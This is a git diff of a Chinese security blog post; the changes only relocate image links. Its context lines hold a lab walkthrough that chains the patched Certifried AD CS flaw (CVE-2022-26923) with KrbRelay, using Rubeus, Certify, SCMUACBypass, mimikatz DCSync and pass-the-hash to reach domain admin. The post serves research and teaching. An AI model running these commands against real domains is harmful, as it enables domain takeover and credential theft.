@@ -16,7 +16,7 @@ layout: post
 
 2022 年 5 月 10 日，微软发布补丁修复了一个 Active Directory 域权限提升漏洞（CVE-2022–26923，Certifried）。该漏洞是由于对用户属性的不正确获取，允许低权限用户在安装了 Active Directory 证书服务（AD CS）服务器角色的 Active Directory 环境中将权限提升至域管理员。这一漏洞最早由安全研究员 Oliver Lyak（[@ly4k_](https://twitter.com/ly4k_)）在 2021 年 12 月 14 日通过 Zero Day Initiative 向微软报告，Microsoft 在 2022 年 5 月的安全更新中对其进行了修补。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220512004633136.png)
+![](/assets/posts/2022-05-19-certifried-combined-with-krbrelay-for-domain-privilege-escalation/image-20220512004633136.png)
 
 默认情况下，域用户可以注册 User 证书模板，域计算机可以注册 Machine 证书模板。两个证书模板都允许客户端身份验证。
 
@@ -24,13 +24,13 @@ layout: post
 
 > Machine 证书模板的 `msPKI-Certificate-Name-Flag` 属性存在一个 `CT_FLAG_SUBJECT_ALT_REQUIRE_DNS` 标志位，其指示 CA 将来自 Active Directory 中请求者计算机对象的 dNSHostName 属性值添加到已颁发证书的主题备用名称中。
 >
-> ![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220511222311143.png)
+> ![](/assets/posts/2022-05-19-certifried-combined-with-krbrelay-for-domain-privilege-escalation/image-20220511222311143.png)
 
 如果我们将一个可控的计算机账户的 `dNSHostName` 值改为与域控制器的计算机账户相同的 `dNSHostName` 值，那么我们变可以欺骗 AD CS，并最终申请到域控制器的 AD 证书。关于该漏洞的更多细节，可以阅读我之前的博客：[《Active Directory 域权限提升漏洞（CVE-2022–26923）》](https://whoamianony.top/certifried-active-directory-domain-privilege-escalation/)。
 
 利用该漏洞的关键是，攻击者拥有域标准用户权限，并通过该用户向域内添加符合漏洞利用条件的机器账户。在未加入域的系统中，我们可以通过简单修改 [Impacket](https://github.com/SecureAuthCorp/impacket) 套件中的 addcomputer.py 来完成这项工作：
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220704011758368.png)
+![](/assets/posts/2022-05-19-certifried-combined-with-krbrelay-for-domain-privilege-escalation/image-20220704011758368.png)
 
 
 然后运行 addcomputer.py 即可成功添加符合条件的计算机账户，如下图所示：
@@ -39,7 +39,7 @@ layout: post
 python3 addcomputer.py pentest.com/Marcus:Marcus\@123 -method LDAPS -computer-name PENTEST\$ -computer-pass Passw0rd -dc-ip dc01.pentest.com -dc-host dc01.pentest.com
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220704012237259.png)
+![](/assets/posts/2022-05-19-certifried-combined-with-krbrelay-for-domain-privilege-escalation/image-20220704012237259.png)
 
 然而，如果我们能过获取某台域成员主机的 SYSTEM 权限，我们可以直接修改这台计算机的 `dNSHostName` 和 `servicePrincipalName` 属性，使其具备漏洞利用条件。
 
@@ -63,9 +63,9 @@ C:\Users\Marcus\Desktop> CheckPort.exe
 C:\Users\Marcus\Desktop> KrbRelay.exe -spn ldap/dc01.pentest.com -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred WIN10-CLIENT1$ -port 10
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220519015044957.png)
+![](/assets/posts/2022-05-19-certifried-combined-with-krbrelay-for-domain-privilege-escalation/image-20220519015044957.png)
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220519015118242.png)
+![](/assets/posts/2022-05-19-certifried-combined-with-krbrelay-for-domain-privilege-escalation/image-20220519015118242.png)
 
 KrbRelay 执行的末尾提供了后续的 Rubeus 命令，使用该命令可以使用基于证书的身份验证请求 TGT 票据，如下图所示。
 
@@ -73,7 +73,7 @@ KrbRelay 执行的末尾提供了后续的 Rubeus 命令，使用该命令可以
 C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:WIN10-CLIENT1$ /certificate:<Base64Certificate> /password:"1d280ec2-5ee9-4e26-b472-2b1af024f336" /getcredentials /show /ptt
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220519015616062.png)
+![](/assets/posts/2022-05-19-certifried-combined-with-krbrelay-for-domain-privilege-escalation/image-20220519015616062.png)
 
 然后，我们通过 Kerberos 的 S4U2Self 扩展协议，使用已获取的 TGT 申请针对 `WIN10-CLIENT1$` 上 HOST 服务的特权 ST 票据，如下图所示。
 
@@ -81,11 +81,11 @@ C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:WIN10-CLIENT1$ /certificate:<Ba
 C:\Users\Marcus\Desktop> Rubeus.exe s4u /self /impersonateuser:PENTEST\Administrator /altservice:HOST/WIN10-CLIENT1 /dc:DC01.pentest.com /ptt /ticket:<Base64EncodedTicket>
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220519024350930.png)
+![](/assets/posts/2022-05-19-certifried-combined-with-krbrelay-for-domain-privilege-escalation/image-20220519024350930.png)
 
 执行 `klist` 命令可以看到，当前主机中已经缓存了域管理员账户的 ST 票据，如下图所示。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220519082002039.png)
+![](/assets/posts/2022-05-19-certifried-combined-with-krbrelay-for-domain-privilege-escalation/image-20220519082002039.png)
 
 现在，我们可以通过调用 SCM APIs 创建系统服务实现本地提权。这项工作可以借助 [SCMUACBypass](https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82) 项目完成。
 
@@ -278,7 +278,7 @@ SCMUACBypass 的原理大概是通过一系列 Tricks 申请到本地计算机�
 C:\Users\Marcus\Desktop> SCMUACBypass.exe
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220519082153438.png)
+![](/assets/posts/2022-05-19-certifried-combined-with-krbrelay-for-domain-privilege-escalation/image-20220519082153438.png)
 
 ## Domain Escalation
 
@@ -300,7 +300,7 @@ $obj.dNSHostName = "dc01.pentest.com"
 $obj.SetInfo()
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220519083402105.png)
+![](/assets/posts/2022-05-19-certifried-combined-with-krbrelay-for-domain-privilege-escalation/image-20220519083402105.png)
 
 ### Machine Persistence via Certificates - PERSIST2
 
@@ -310,7 +310,7 @@ $obj.SetInfo()
 .\Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /template:Machine /machine
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220519084344608.png)
+![](/assets/posts/2022-05-19-certifried-combined-with-krbrelay-for-domain-privilege-escalation/image-20220519084344608.png)
 
 我们可以使用 openssl 将这个 .pem 格式的文本转换为可利用的 .pfx 格式，并保存为 dc01.pfx 文件，相关命令如下。在这个过程中需要为 dc01.pfx 设置一个保护密码。
 
@@ -324,11 +324,11 @@ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provid
 C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:DC01$ /certificate:dc01.pfx /password:Passw0rd /ptt
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220519085254729.png)
+![](/assets/posts/2022-05-19-certifried-combined-with-krbrelay-for-domain-privilege-escalation/image-20220519085254729.png)
 
 执行 `klist` 命令可以看到，当前主机中已经缓存了域控制器账户的 TGT 票据，如下图所示。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220519085349342.png)
+![](/assets/posts/2022-05-19-certifried-combined-with-krbrelay-for-domain-privilege-escalation/image-20220519085349342.png)
 
 ### DCSync
 
@@ -338,13 +338,13 @@ C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:DC01$ /certificate:dc01.pfx /pa
 mimikatz.exe "lsadump::dcsync /domain:pentest.com /user:PENTEST\Administrator" exit
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220519085707880.png)
+![](/assets/posts/2022-05-19-certifried-combined-with-krbrelay-for-domain-privilege-escalation/image-20220519085707880.png)
 
 ### Pass The Hash
 
 最终，通过哈希传递可以成功获取域控制器权限，如下图所示。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220519090104168.png)
+![](/assets/posts/2022-05-19-certifried-combined-with-krbrelay-for-domain-privilege-escalation/image-20220519090104168.png)
 
 ## Ending......
 
